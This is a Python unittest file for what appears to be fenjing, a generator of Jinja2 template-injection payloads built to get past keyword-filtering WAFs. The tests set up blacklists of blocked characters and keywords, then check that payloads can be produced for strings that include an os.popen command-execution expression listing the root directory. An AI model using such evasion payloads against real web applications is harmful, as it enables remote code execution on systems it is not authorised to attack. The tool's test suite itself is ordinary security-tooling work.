import sys  # noqa

sys.path.append("..")  # noqa

import unittest
import fenjing
from flask import render_template_string


from fenjing.payload_gen import PayloadGenerator
from fenjing import const
import logging

fenjing.payload_gen.logger.setLevel(logging.ERROR)
logging.basicConfig(level=logging.INFO)


def get_payload_gen(blacklist, context):
    def waf_func(x):
        return all(word not in x for word in blacklist)

    return PayloadGenerator(waf_func, context)


class PayloadGenTestCaseSimple(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.payload_gen = get_payload_gen(
            [
                "[",
            ],
            {},
        )

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))

    def test_os_popen_read(self):
        self.assertIsNotNone(
            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
        )


class PayloadGenTestCaseNoNumber(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.payload_gen = get_payload_gen(
            ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
            {
                "l": 1,
                "e": 3,
                "lo": 10,
                "loo": 100,
                "eoo": 300,
            },
        )

    def test_integers(self):
        for num in range(1, 128):
            self.assertIsNotNone(self.payload_gen.generate(const.INTEGER, num))

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))

    def test_os_popen_read(self):
        self.assertIsNotNone(
            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
        )


class PayloadGenTestCaseHard(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.payload_gen = get_payload_gen(
            [
                "config",
                "self",
                "g",
                "os",
                "class",
                "length",
                "mro",
                "base",
                "lipsum",
                "[",
                '"',
                "'",
                "_",
                ".",
                "+",
                "~",
                "{{",
                "0",
                "1",
                "2",
                "3",
                "4",
                "5",
                "6",
                "7",
                "8",
                "9",
                "０",
                "１",
                "２",
                "３",
                "４",
                "５",
                "６",
                "７",
                "８",
                "９",
            ],
            {
                "l": 1,
                "e": 3,
                "lo": 10,
                "loo": 100,
                "eoo": 300,
            },
        )

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))

    def test_os_popen_read(self):
        self.assertIsNotNone(
            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
        )
